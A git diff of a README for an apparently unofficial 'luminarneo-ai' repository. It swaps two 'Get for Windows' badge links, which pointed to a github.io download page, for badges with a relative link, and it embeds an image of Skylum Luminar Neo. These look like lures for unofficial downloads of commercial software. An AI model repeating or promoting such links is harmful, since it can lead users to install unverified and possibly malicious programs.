@@ -5,11 +5,7 @@
 </div>  
 <br>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://luminarneo-ai-photolab.github.io/.github/)
-
-</div>
+[![GET luminarneo ai](https://img.shields.io/badge/GET%20%E2%80%94%20luminarneo-ai-0078D6?style=for-the-badge&logoColor=white)](luminarneo-ai)
 
 ---
 
@@ -26,11 +22,7 @@
   <img src="https://i0.wp.com/www.lifeafterphotoshop.com/wp-content/uploads/2022/08/skylum-luminar-neo-06.jpg?resize=1024%2C576&ssl=1" width="800"/> 
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://luminarneo-ai-photolab.github.io/.github/)
-
-</div>
+[![GET luminarneo ai](https://img.shields.io/badge/GET%20%E2%80%94%20luminarneo-ai-0078D6?style=for-the-badge&logoColor=white)](luminarneo-ai)
 
 ---
 
